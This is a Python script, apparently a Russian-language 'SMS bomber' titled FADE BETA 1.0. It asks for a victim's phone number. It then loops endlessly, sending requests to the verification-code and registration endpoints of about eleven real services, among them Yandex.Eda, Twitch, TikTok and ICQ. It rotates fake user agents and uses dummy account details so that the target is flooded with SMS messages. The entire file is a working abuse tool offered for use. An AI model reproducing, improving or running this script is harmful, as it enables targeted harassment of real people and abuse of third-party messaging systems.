import requests, fake_useragent, time, colorama

user = fake_useragent.UserAgent().random
headers = {'user_agent' : user}
first_name = "RsphCXGjTO"
first_name2 = "Александр"
email  = "FKAsadsLrD@gmail.com"
password = "fGnRqLsPoZx12"
username = "RsphCXGjTO"
def out_red(text):
    print("\033[31m {}" .format(text))
def out_yellow(text):
    print("\033[33m {}" .format(text))
def out_blue(text):
    print("\033[34m {}" .format(text))
out_red("""  

█████▒▄▄▄      ▓█████▄ ▓█████ 
▓██   ▒▒████▄    ▒██▀ ██▌▓█   ▀ 
▒████ ░▒██  ▀█▄  ░██   █▌▒███   
░▓█▒  ░░██▄▄▄▄██ ░▓█▄   ▌▒▓█  ▄ 
░▒█░    ▓█   ▓██▒░▒████▓ ░▒████▒
 ▒ ░    ▒▒   ▓▒█░ ▒▒▓  ▒ ░░ ▒░ ░
 ░       ▒   ▒▒ ░ ░ ▒  ▒  ░ ░  ░
   ░     ░   ▒    ░ ░  ░    ░   
             ░  ░   ░       ░  ░
                  ░          
            BETA 1.0                
""")
mode = input("""Выберите режим
1 - SMS
2 - ЗВОНКИ (скоро)
Режим - """)
if (mode == '1'):
    phone = input('Введите номер телефона жертвы: ')
    phonePizzahut = '+' + phone[0] + ' (' + phone[1:4] + ') ' + phone[4:7] + ' ' + phone[7:9] + ' ' + phone[9:11]
    print("Что-бы остановить, закройте приложение")
    while True:
        user = fake_useragent.UserAgent().random
        headers = {'user_agent': user}
        try:
            req2 = requests.post(
                "https://eda.yandex/api/v1/user/request_authentication_code",
                json={"phone_number": phone},
                headers=headers,)
            print("Сообщение отправлено на номер " + "+" + phone + " от сервиса Яндекс.Еда")
        except:
            pass
        try:
            requests.post(f"https://www.citilink.ru/registration/confirm/phone/+{phone}/", data={}, headers = headers,)
            print("Сообщение отправлено на номер " + "+" + phone + " от сервиса Ситилинк")
        except:
            pass
        try:
            test = requests.post("https://api.boosty.to/oauth/phone/authorize", data={'client_id' : "+" + phone}, headers = headers)
            print("Сообщение отправлено на номер " + "+" + phone + " от сервиса Boosty")
        except:
            pass
        try:
            test2 = requests.post("https://youla.ru/web-api/auth/request_code", data={'phone' : phone}, headers = headers)
            print("Сообщение отправлено на номер " + "+" + phone + " от сервиса Юла")
        except:
            pass
        try:
            test3 = requests.post("https://account.my.games/signup_send_sms/", data={'phone' : phone}, headers = headers)
            print("Сообщение отправлено на номер " + "+" + phone + " от сервиса My.Games")
        except:
            pass
        try:
            test4= requests.post ("https://www.icq.com/smsreg/requestPhoneValidation.php",
            data = {
                       "msisdn": phone,
                       "locale": "en",
                       "countryCode": "ru",
                       "version": "1",
                       "k": "ic1rtwz1s1Hj1O0r",
                       "r": "46763",
                   },
            headers = headers,)
            print("Сообщение отправлено на номер " + "+" + phone + " от сервиса ICQ")
        except:
            pass
        try:
            test5 = requests.post(
                "https://cloud.mail.ru/api/v2/notify/applink",
                json={
                    "phone": "+" + phone,
                    "api": 2,
                    "email": email,
                    "x-email": "x-email",
                },
                headers=headers)
            print("Сообщение отправлено на номер " + "+" + phone + " от сервиса Cloud.Mail.ru")
        except:
            pass
        try:
            requests.post(
                "https://passport.twitch.tv/register?trusted_request=true",
                json={
                    "birthday": {"day": 12, "month": 10, "year": 2000},
                    "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp",
                    "include_verification_code": True,
                    "password": password,
                    "phone_number": phone,
                    "username": username,
                },
                headers=headers,
            )
            print("Сообщение отправлено на номер " + "+" + phone + " от сервиса Twitch")
        except:
            pass
        try:
            requests.post(
                "https://md-fashion.com.ua/bpm/validate-contact",
                data={"phone": "+" + phone},
                headers=headers,
            )
            print("Сообщение отправлено на номер " + "+" + phone + " от сервиса MDFashion")
        except:
            pass
        try:
            requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": phone, "SignupForm[device_type]": 3}, headers = headers)
            print("Сообщение отправлено на номер " + "+" + phone + " от сервиса DELITIME")
        except:
            pass
        try:
            requests.post("https://m.tiktok.com/node-a/send/download_link",
                          json={"slideVerify": 0, "language": "ru", "PhoneRegionCode": "7", "Mobile": phone[1:],
                                "page": {"pageName": "home", "launchMode": "direct", "trafficType": ""}},
                          headers = headers)
            print("Сообщение отправлено на номер " + "+" + phone + " от сервиса TikTok")
        except:
            pass
else:
    print("Неверный режим! Перезапустите программу.")
    input()